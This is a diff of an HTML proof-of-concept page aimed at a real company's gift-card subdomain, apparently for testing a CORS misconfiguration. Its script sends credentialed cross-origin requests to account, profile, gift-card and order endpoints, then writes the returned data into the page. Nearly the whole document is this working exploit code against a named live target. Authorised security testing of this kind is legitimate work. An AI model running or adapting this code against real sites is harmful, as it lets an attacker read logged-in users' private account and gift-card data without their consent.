@@ -1,34 +1,57 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>CORS PoC - giftcards.kroger.com</title>
-  </head>
-  <body>
-    <h1>Fetching sensitive data from Kroger gift cards subdomain...</h1>
-    <script>
-      const endpoints = [
-        "/api/user/profile",
-        "/mySettings",
-        "/account",
-        "/dashboard",
-        "/user/info",
-        "/giftCard",
-        "/orders"
-      ];
+<head>
+  <title>CORS PoC - giftcards.kroger.com</title>
+</head>
+<body>
+  <h1>CORS Exploit Test: giftcards.kroger.com</h1>
+  <p>Trying to fetch sensitive endpoints using cross-origin request...</p>
 
-      endpoints.forEach(endpoint => {
-        fetch("https://giftcards.kroger.com" + endpoint, {
-          credentials: "include"
-        })
-        .then(res => res.text())
-        .then(data => {
-          document.body.innerHTML += `<h3>Endpoint: ${endpoint}</h3><pre>${data}</pre>`;
-        })
-        .catch(err => {
-          document.body.innerHTML += `<h3 style="color:red;">${endpoint} failed</h3>`;
-          console.error(err);
-        });
+  <div id="results"></div>
+
+  <script>
+    const endpoints = [
+      "/mySettings",
+      "/account",
+      "/api/user/profile",
+      "/dashboard",
+      "/user/info",
+      "/giftCard",
+      "/orders"
+    ];
+
+    const output = document.getElementById("results");
+
+    endpoints.forEach(endpoint => {
+      fetch("https://giftcards.kroger.com" + endpoint, {
+        method: "GET",
+        credentials: "include",
+        mode: "cors"
+      })
+      .then(res => {
+        return res.text().then(data => ({
+          status: res.status,
+          url: endpoint,
+          body: data
+        }));
+      })
+      .then(result => {
+        const div = document.createElement("div");
+        div.innerHTML = `
+          <h3>✅ ${result.url} (Status: ${result.status})</h3>
+          <pre>${result.body}</pre>
+        `;
+        output.appendChild(div);
+      })
+      .catch(error => {
+        const div = document.createElement("div");
+        div.innerHTML = `
+          <h3 style="color:red;">❌ ${endpoint} failed</h3>
+          <pre>${error}</pre>
+        `;
+        output.appendChild(div);
       });
-    </script>
-  </body>
+    });
+  </script>
+</body>
 </html>
